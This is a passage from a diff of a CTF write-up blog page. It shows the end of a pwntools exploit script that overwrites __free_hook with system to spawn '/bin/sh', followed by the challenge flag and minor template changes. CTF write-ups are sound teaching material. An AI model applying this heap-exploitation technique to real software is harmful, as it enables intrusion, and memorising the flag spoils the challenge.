+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span> top_pointer <span class="token operator">+</span> <span class="token number">0x1360</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+visit<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+sleep<span class="token punctuation">(</span>io<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b">"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"trading in?"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>actf{hav3_you_4ny_dreams_y0u&#39;d_like_to_s3ll?_cb72f5211336}</p>
 
@@ -267,7 +368,7 @@
 
   <div class="copyright">
     &copy; 
-    <span itemprop="copyrightYear">2024</span>
+    <span itemprop="copyrightYear">2025</span>
     <span class="with-love">
       <i class="fa fa-heart"></i>
     </span>
@@ -294,28 +395,6 @@
 <noscript>
   <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
 </noscript>
-
-
-  
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
-<script src="/js/third-party/search/local-search.js"></script>
-
-
-
-
-
-
-
-  
-
-
-
-
 
 </body>
 </html>
